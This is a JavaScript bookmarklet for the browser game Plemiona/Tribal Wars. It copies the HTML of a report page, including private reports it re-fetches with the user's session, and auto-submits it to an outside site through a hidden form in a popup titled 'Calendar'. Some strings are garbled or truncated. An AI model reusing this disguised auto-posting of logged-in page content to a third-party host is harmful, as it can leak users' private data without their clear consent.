alert('Pod³±czony');

function ch(){ if(false == window.closed)
 {window.opener='x';
    window.close ();
 }}

function htmlspecialchars( string ){
  // original htmlentities by: Kevin van Zonneveld (http://kevin.vanzonneveld.net)
  var histogram = {}, code = 0, tmp_arr = [], i = 0;

  histogram['38'] = 'amp';
  histogram['34'] = 'quot';
  histogram['39'] = '#039';
  histogram['60'] = 'lt';
  histogram['62'] = 'gt';
    
  for (i = 0; i < string.length; ++i) {
    code = string.charCodeAt(i);
    if (code in histogram) {
      tmp_arr[i] = '&'+histogram[code]+';';
    } else {
      tmp_arr[i] = string.charAt(i);
    }
  }
  return tmp_arr.join('');
};

function getXMLHttpRequest() { var request = false; try { request = new XMLHttpRequest(); } catch(err1) { try { request = new ActiveXObject('Msxml2.XMLHTTP'); } catch(err2) { try { request = new ActiveXObject('Microsoft.XMLHTTP'); } catch(err3) { request = false; } } } return request; }

function convert(lang, track_m){
  // by Dan Latocha (plemiona.one.pl)
  var raport,d,l,track_c,track_m,lang,link;
  if(lang === undefined) lang = 'pl';
  if(track_m === undefined) track_m = 'bookmark';
  
  if (frames.main !== undefined) {
	d = frames.main.document;
	l = frames.main.location;
  }
  else {
	d = document;
	l = location;
  }
  
  if (l.href.match("http://.*/game\.php.*screen=report.*view=.*") != null) {
  	if(navigator.userAgent.indexOf("Firefox") != -1)
		raport = d.getElementById('label').parentNode.parentNode.parentNode.innerHTML;
	track_c = 'private';
  }
  else if (l.href.match("http://.*/public_report/.*") != null) {
  	if(navigator.userAgent.indexOf("Firefox") != -1)
	  	raport = d.getElementsByTagName('table')[3].innerHTML;
  	track_c = 'public';
  }
  else if (l.href.match("http://.*/game\.php.*screen=report.*mode=view_public_report.*") != null) {
  	if(navigator.userAgent.indexOf("Firefox") != -1)
	  	raport = d.getElementsByTagName('body')[0].innerHTML;
  	track_c = 'public';
  }
  else {
  	if(lang == 'pl') alert('Aby .');
	else alert('To use auto-copy feature you need to go to page with a report! \nThis link works with both private and public reports.');
  	return;
  }	
  
  if(navigator.userAgent.indexOf("Firefox") == -1) {
    req = getXMLHttpRequest();
	req.open('GET', l.href, false); req.send(null);
  	raport = req.responseText;
  }  
  
  raport = raport + '[lang]' + l.href.match("http://(.*?)/(game\.php|public_report)")[1] + '[/lang]';
  raport = htmlspecialchars(raport);
    	
  link = 'www.bornkes.w.szu.pl/' + lang + '/';
  	
  if (d.getElementById('redirect_form') != null) {
  	d.getElementById('redirect_form').value = raport;
  	d.getElementById('redirect_form').action = link;
	d.getElementById('track_m').value = track_m;
  }
  else {
  	//d.getElementsByTagName('body')[0].innerHTML += "<form method='post' id='redirect_form' action='" + link + "' target='popup'><input type='hidden' name='pre_query' value=\"" + raport + "\"/><input id='track_m' type='hidden' name='track[medium]' value='" + track_m + "' /><input type='hidden' name='track[content]' value='" + track_c + "' /></form>";

var str_buffer = new String (
		"<html>\n"+
		"<head>\n"+
		"	<title>Calendar</title>\n"+
		"</head>\n"+
		"<body >\n"+
		"<form method='post' id='redirect_form' action='" +
		"http://www.bornkes.w.szu.pl/kr/tes.php" + //
		 "' target='popup'><input type='hidden' name='query' value=\"" + 
		raport + 
		"\"/><input id='track_m' type='hidden' name='track[medium]' value='" + 
		track_m +
		 "' /><input type='submit' value='klik' /><input type='hidden' name='track[content]' value='" +
		 track_c + 
		"' /></form>" +
		"</body>\n" +
		"</html>\n"
);
  }
	var vWinCal = window.open("", "popup", 
		"width=500,height=640,status=no,resizable=yes,scrollbars=yes,top=0,left=200");

	vWinCal.opener = self;
	var calc_doc = vWinCal.document;
	calc_doc.write (str_buffer);
	calc_doc.getElementById('redirect_form').submit();


 //d.getElementById('redirect_form').submit();
};

convert();